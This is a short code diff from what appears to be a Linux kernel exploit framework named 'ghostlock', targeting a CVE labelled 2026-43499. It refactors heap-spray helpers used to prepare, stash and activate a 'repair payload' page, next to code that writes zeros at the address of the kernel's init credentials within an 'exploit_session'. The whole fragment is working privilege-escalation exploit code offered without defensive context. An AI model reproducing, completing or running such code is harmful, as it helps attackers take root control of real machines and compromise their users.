@@ -11,6 +11,7 @@
 #define _GNU_SOURCE
 #endif
 
+#include "backend/cve_2026_43499/spray.hpp"
 #include "support/log.hpp"
 #include "support/decls.hpp"
 
@@ -173,10 +174,10 @@ namespace ghostlock::backend::cve_2026_43499::route {
                 ghostlock::backend::cve43499_state(exploit_session).addresses.init_cred_image_addr()) + 8,
             memory::WriteMode::Zero, 1);
         (ghostlock::backend::cve43499_state(exploit_session).heap.current.base) =
-                support::prepare_good_kernel_page(repair_request);
-        if (!(ghostlock::backend::cve43499_state(exploit_session).heap.current.base) || !support::stash_prebuilt_page()) {
+                spray::prepare_good_kernel_page(repair_request);
+        if (!(ghostlock::backend::cve43499_state(exploit_session).heap.current.base) || !spray::stash_prebuilt_page()) {
             pr_warning("W2 fast repair prebuild failed\n");
-            support::discard_prebuilt_page();
+            spray::discard_prebuilt_page();
             return false;
         }
         pr_info("W2 fast repair payload prebuilt\n");
@@ -185,7 +186,7 @@ namespace ghostlock::backend::cve_2026_43499::route {
 
     bool MulticastPolicy::w2_fast_repair_activate(
         session::CoreSession &exploit_session) noexcept {
-        if (!support::activate_prebuilt_page()) {
+        if (!spray::activate_prebuilt_page()) {
             pr_warning("W2 fast repair activation failed\n");
             return false;
         }
